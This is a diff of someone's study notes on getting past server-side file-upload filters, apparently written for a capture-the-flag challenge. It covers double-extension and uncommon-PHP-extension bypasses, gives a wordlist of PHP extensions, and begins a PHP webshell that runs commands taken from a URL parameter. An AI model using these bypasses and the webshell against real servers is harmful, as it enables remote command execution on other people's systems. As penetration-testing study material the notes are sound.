@@ -72,17 +72,26 @@ b) The POST request sent to the server, enabling the removal of client-side filt
 
 ### Bypassing server-side filtering
 
-1. Presence of valid file extension anywhere within the filename (whitelist)
+1. Presence of valid file extension anywhere within the filename (_whitelist_)
 
-Eg. Given that the the only valid file extension is `.jpg`. A list of valid filenames can be the following: `shell.jpg.php`, etc.
+Some server-side filtering logic may involve simply checking for the presence of a file extension string within the filename:
+
+```php
+IF STRING ".[file-ext]" IS IN VARIABLE <user_input>:
+    PROCEED
+ELSE:
+    RETURN ERROR MESSAGE
+```
+
+Eg. Given that the valid file extension is `.jpg`. A possible valid filename can be: `shell.jpg.php`. This allows us to bypass the filter and upload a PHP file.
 
 
 
-2. Uncommon file extension for the same filetype (blacklist)
+2. Uncommon file extension for the same file-type (_blacklist_)
+
+Some server-side filtering logic may check the file extension, and reject the file based on a blacklist. However, chances are that the list is non-exhaustive of all the possible file extensions for the same file-type. This allows us to sneak a filename through the filters, which may be recognized and properly executed by the server.
 
 Refer to the sub-page named: _**File extension cheat-sheet**_.
-
-
 
 ### Examples
 
@@ -92,7 +101,9 @@ Eg.
 
 This challenge requires the combination of method 1 and 2 discussed above (\*\*TO CONFIRM).
 
-`php-ext.txt`
+I decided to create a simple Bash shell script to automate the process of finding the valid filename.
+
+_**php-ext.txt**_ (wordlist of PHP file extensions)
 
 ```
 .phtml
@@ -104,8 +115,9 @@ This challenge requires the combination of method 1 and 2 discussed above (\*\*T
 .php-s
 .pht
 .phar
-
 ```
+
+_**Bash shell script**_
 
 ```sh
 #!/bin/bash
@@ -135,7 +147,9 @@ The accepted PHP shell script filename is `shell.jpg.php5`.
 
 
 
-```
+Simple webshell (to transfer to a dedicated _**WEBSHELL**_ section?)
+
+```php
 <?php
 // Check if 'cmd' parameter is set in the URL
 if (isset($_GET['cmd'])) {
